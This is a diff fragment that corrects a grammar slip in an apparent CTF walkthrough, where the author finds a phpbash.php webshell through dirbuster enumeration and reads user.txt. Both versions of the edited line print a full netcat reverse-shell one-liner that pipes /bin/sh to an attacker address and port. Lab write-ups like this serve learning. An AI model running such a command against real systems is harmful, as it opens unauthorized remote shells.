@@ -53,7 +53,7 @@ Utilize the dirbuster to enumerate the directories.
 
 ![AgfTPJ.png](https://s2.ax1x.com/2019/04/04/AgfTPJ.png)
 
-Wow. Find it and open the file `phpbash.php`. Here is the webshell. I have tried to reverse shell by `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.44 1234 >/tmp/f`. But the shell cannot be return. Whatever, I can obtain the user.txt.
+Wow. Find it and open the file `phpbash.php`. Here is the webshell. I have tried to reverse shell by `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.44 1234 >/tmp/f`. But the shell cannot be returned. Whatever, I can obtain the user.txt.
 
 ![AghFMt.png](https://s2.ax1x.com/2019/04/04/AghFMt.png)
 
